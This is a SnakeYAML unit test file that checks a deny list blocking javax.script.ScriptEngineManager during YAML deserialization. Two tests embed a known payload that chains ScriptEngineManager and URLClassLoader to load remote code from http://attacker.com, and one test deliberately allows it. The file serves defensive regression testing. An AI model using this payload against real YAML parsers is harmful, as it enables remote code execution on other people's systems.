/**
 * Copyright (c) 2008, SnakeYAML
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the License
 * is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the License for the specific language governing permissions and limitations under
 * the License.
 */
package org.yaml.snakeyaml.issues.issue564;

import org.junit.Test;
import org.yaml.snakeyaml.LoaderOptions;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.ClassNameInspector;
import org.yaml.snakeyaml.constructor.DefaultClassNameInspector;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class ClassNameInspectorTest {

  /**
   * https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/
   */
  @Test
  public void testDenyScriptEngineManager() {
    try {
      String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
          + "[[!!java.net.URL [\"http://attacker.com\"]]]]";
      Yaml yaml = new Yaml(); // Unsafe instance of Yaml that allows any constructor to be called.
      yaml.load(malicious); // Make request to http://attacker.com

      fail("ScriptEngineManager should not be accepted");
    } catch (Exception e) {
      assertTrue(e.getMessage(),
          e.getMessage().startsWith("Class is not allowed: javax.script.ScriptEngineManager"));
    }
  }

  @Test
  public void testAllowScriptEngineManager() {
    LoaderOptions options = new LoaderOptions();
    options.setClassNameInspector(new ClassNameInspector() {

      @Override
      public boolean isAllowed(String fullClassName) {
        return true;
      }
    });

    String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
        + "[[!!java.net.URL [\"http://attacker.com\"]]]]";
    Yaml yaml = new Yaml(options); // Unsafe instance of Yaml that allows any constructor to be
    // called.
    Object obj = yaml.load(malicious); // Make request to http://attacker.com
    assertNotNull(obj);
  }

  @Test
  public void testDefaultListSize() {
    assertEquals(2, DefaultClassNameInspector.defaultList().size());
  }
}
